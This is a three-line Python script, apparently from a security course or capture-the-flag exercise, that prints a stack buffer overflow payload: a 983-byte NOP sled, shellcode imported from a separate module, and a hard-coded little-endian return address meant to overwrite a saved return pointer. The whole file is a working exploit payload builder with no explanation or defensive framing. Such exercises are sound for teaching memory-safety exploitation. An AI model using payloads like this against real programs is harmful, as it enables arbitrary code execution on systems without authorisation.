from shellcode import shellcode
import sys
sys.stdout.buffer.write(983*b'\x90'+shellcode+ 0xfff6cc58.to_bytes(4, "little"))
